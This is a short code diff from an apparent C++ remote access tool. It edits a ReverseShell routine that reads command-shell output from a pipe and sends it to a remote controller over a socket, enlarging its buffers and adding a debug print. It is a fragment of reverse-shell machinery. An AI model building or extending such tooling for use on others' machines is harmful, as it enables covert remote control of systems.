@@ -652,7 +652,7 @@ void ReverseShell::TerminarShell() {
 
 void ReverseShell::thLeerShell(HANDLE hPipe) {
     //int iLen = 0; , iRet = 0;
-    char cBuffer[256], cBuffer2[256 * 2 + 30];
+    char cBuffer[4096], cBuffer2[4096 * 2 + 30];
     DWORD dBytesReaded = 0, dBufferC = 0, dBytesToWrite = 0;
     BYTE bPChar = 0;
     while (this->isRunning) {
@@ -674,6 +674,8 @@ void ReverseShell::thLeerShell(HANDLE hPipe) {
             std::string strOut = std::to_string(EnumComandos::Reverse_Shell_Salida);
             strOut.append(1, '\\');
             strOut += cBuffer2;
+            
+            std::cout<<"Sending \n"<<strOut<<std::endl;
 
             int iEnviado = this->copy_ptr->cSend(this->sckSocket, strOut.c_str(), strOut.size(), 0, false);
             Sleep(10);
